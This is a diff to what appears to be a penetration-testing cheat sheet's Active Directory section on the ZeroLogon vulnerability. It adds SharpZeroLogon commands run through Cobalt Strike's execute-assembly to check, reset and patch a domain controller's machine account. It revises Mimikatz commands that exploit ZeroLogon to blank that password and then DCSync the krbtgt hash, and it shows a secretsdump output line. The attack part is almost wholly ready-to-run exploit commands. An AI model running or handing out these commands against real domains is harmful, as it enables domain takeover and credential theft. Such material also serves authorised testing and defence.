@@ -292,16 +292,28 @@ $ secretsdump.py 'domain/DC01$@DC01.domain.local' -hashes aad3b435b51404eeaad3b4
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:00000000000000000000000000000000:::  
 ```
 
+in .NET for Cobalt Strike's execute-assembly
+
+```powershell
+git clone https://github.com/nccgroup/nccfsas
+# Check
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local
+# Resetting the machine account password
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
+# Testing from a non Domain-joined machine
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
+```
+
 with Mimikatz : 2.2.0 20200916 ZeroLogon & DCSync
 
 ```powershell
 privilege::debug
-# check for the CVE
-lsadump::zerologon /target:DC01.corp.local /account:DC01$
-# exploit the CVE and set the computer account's password to ""
-lsadump::zerologon /target:DC01.corp.local /account:DC01$ /exploit
-# dcsync to extract some hashes
-lsadump::dcsync /domain:CORP.LOCAL /dc:dc01.corp.local /user:krbtgt /authuser:DC01$ /authdomain:CORP /authpassword:"" /authntlm
+# Check for the CVE
+lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$
+# Exploit the CVE and set the computer account's password to ""
+lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit
+# Execute dcsync to extract some hashes
+lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
 ```
 
 ### Open Shares
